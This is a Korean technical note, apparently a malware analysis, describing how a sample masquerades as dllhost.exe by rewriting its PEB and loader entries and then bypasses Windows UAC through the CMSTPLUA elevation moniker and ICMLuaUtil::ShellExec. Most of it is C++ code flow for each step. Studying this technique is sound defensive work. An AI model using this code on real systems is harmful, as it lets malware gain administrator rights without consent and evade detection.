#com 
## 0. Concept

자신을 dllhost.exe로 위장시킨다. 윈도우 권한 상승 모니커를 사용하여 CMSTPLUA 객체를 생성하고 ICMLuaUtil 인터페이스를 획득한다. 내부에서 ShellExecuteEx API가 호출되는 ICMLuaUtil::ShellExec에 악성 코드의 파일 경로와 파라미터를 전달하여 사용하여 자신을 dllhost.exe의 자식 프로세스로 실행시켜 UAC Bypass를 수행한다.

1. 자기 자신의 PEB.ProcessPrameters와 LDR_DATA_TABLE_ENTRY 정보를 dllhost.exe로 수정.
	- Process Masquerading 기법.
2. 윈도우 권한 상승 모니커를 사용하여 관리자 권한으로 CMSTPLUA 객체를 생성하고 ICMLuaUtil를 획득.
3. ICMLuaUtil::ObjectStublessClient9을 호출하여 dllhost.exe의 자식 프로세스로 자신을 실행.
	- 자식 프로세스로 실행된 악성 코드는 dllhost.exe와 같은 높은 권한을 갖게 됨.

## 1. Process Masquerading

### Code Flow

```C++
void EnumloadedModulesCallback(PLDR_DATA_TABLE_ENTRY ldte,PEB *p_peb,bool *stop) {
	if (p_peb->ImageBaseAddress == ldte->DllBase) {
	    RtlInitUnicodeString(&ldte->FullDllName,MASQUERADING_PATH_PTR);
	    RtlInitUnicodeString(&ldte->BaseDllName,MASQUERADING_FILE_NAME_PTR);
	    *stop = true;
	}
	else {
		*stop = false;
	}
	return;
}

RtlEnterCriticalSection(p_peb->FastPebLock);
upp = p_peb->ProcessParameters;
RtlInitUnicodeString(&upp->ImagePathName,MASQUERADING_PATH_PTR);
RtlInitUnicodeString(&upp->CommandLine,ELEVATION_CMDLINE_PTR);
RtlLeaveCriticalSection(p_peb->FastPebLock);
LdrEnumerateLoadedModules(0x0,EnumloadedModulesCallback,p_peb);
```


## 2. 윈도우 권한 상승 모니커

### Code Flow

```C++
CoInitialize(NULL);
// IID_ICMLuaUtil = {6EDD6D74-C007-4E75-B76A-E5740995E24C}
// CLSID_CMSTPLUA = {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
moniker = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
CoGetObject(&moniker,&bo,&iid_icmluautil,&pICMLuaUtil);
```


## 3. ICMLuaUtil::ShellExec

### Code Flow

```C++
// ICMLuaUtil::ShellExec
(**(*pICMLuaUtil + 0x24))(pICMLuaUtil, exec_path, parmeters,0x0,0x0,0x0);
// ICMLuaUtil::Release
(**(*pICMLuaUtil + 0x8))(pICMLuaUtil);
CoUninitialize();
```